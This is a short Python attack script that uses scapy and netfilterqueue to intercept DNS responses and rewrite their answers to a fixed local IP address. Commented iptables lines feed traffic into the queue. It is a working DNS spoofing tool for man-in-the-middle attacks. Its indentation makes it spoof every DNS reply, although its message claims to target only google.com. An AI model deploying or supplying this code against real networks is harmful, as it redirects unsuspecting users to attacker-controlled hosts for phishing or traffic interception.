#!usr/bin/env python
import scapy.all as scapy
import netfilterqueue


def process_packet(packet):
    # print(packet.get_payload())
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in qname:
            print("[+]Spoofing google.com ")
        answer = scapy.DNSRR(rname=qname, rdata="192.168.2.213")
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1

        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum
        packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()










# subprocess.call(["sudo", "iptables", "-I", "FORWARD -j NFQUEUE --queue-num 0"])
# subprocess.call(["sudo", "iptables", "-I", "OUTPUT -j NFQUEUE --queue-num 0"])
# subprocess.call(["sudo", "iptables", "-I", "INPUT -j NFQUEUE --queue-num 0"])
